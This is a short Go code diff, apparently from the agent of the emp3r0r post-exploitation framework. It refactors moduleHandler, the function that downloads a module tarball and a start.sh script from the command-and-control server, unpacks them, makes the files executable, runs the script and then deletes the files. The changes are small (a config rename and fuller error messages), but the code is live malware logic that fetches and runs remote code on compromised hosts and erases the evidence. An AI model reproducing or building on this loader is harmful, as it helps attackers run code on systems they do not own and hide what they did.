@@ -17,8 +17,8 @@ import (
 )
 
 func moduleHandler(modName, checksum string) (out string) {
-	tarball := emp3r0r_data.AgentRoot + "/" + modName + ".tar.bz2"
-	modDir := emp3r0r_data.AgentRoot + "/" + modName
+	tarball := RuntimeConfig.AgentRoot + "/" + modName + ".tar.bz2"
+	modDir := RuntimeConfig.AgentRoot + "/" + modName
 	start_sh := modDir + "/start.sh"
 
 	// if we have already downloaded the module, dont bother downloading again
@@ -38,8 +38,8 @@ func moduleHandler(modName, checksum string) (out string) {
 
 	// extract files
 	os.RemoveAll(modDir)
-	if err := archiver.Unarchive(tarball, emp3r0r_data.AgentRoot); err != nil {
-		return err.Error()
+	if err := archiver.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
+		return fmt.Sprintf("Unarchive module tarball: %v", err)
 	}
 
 	// download start.sh
@@ -47,7 +47,7 @@ func moduleHandler(modName, checksum string) (out string) {
 	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+modName+".sh",
 		start_sh)
 	if err != nil {
-		return err.Error()
+		return fmt.Sprintf("Downloading start.sh: %v", err)
 	}
 
 	// exec
@@ -59,7 +59,23 @@ func moduleHandler(modName, checksum string) (out string) {
 	if err != nil {
 		return fmt.Sprintf("cd to module dir: %v", err)
 	}
-	defer os.Chdir(pwd)
+
+	// process files in module archive
+	libs_tarball := "libs.tar.xz"
+	files, err := ioutil.ReadDir("./")
+	if err != nil {
+		return fmt.Sprintf("Processing module files: %v", err)
+	}
+	for _, f := range files {
+		os.Chmod(f.Name(), 0700)
+		if util.IsFileExist(libs_tarball) {
+			os.RemoveAll("libs")
+			err = archiver.Unarchive(libs_tarball, "./")
+			if err != nil {
+				return fmt.Sprintf("Unarchive %s: %v", libs_tarball, err)
+			}
+		}
+	}
 
 	cmd := exec.Command(emp3r0r_data.DefaultShell, start_sh)
 
@@ -76,6 +92,7 @@ func moduleHandler(modName, checksum string) (out string) {
 	}
 
 	defer func() {
+		os.Chdir(pwd)
 		// remove module files if it's non-interactive
 		if !util.IsStrInFile("echo emp3r0r-interactive-module", start_sh) {
 			os.RemoveAll(modDir)
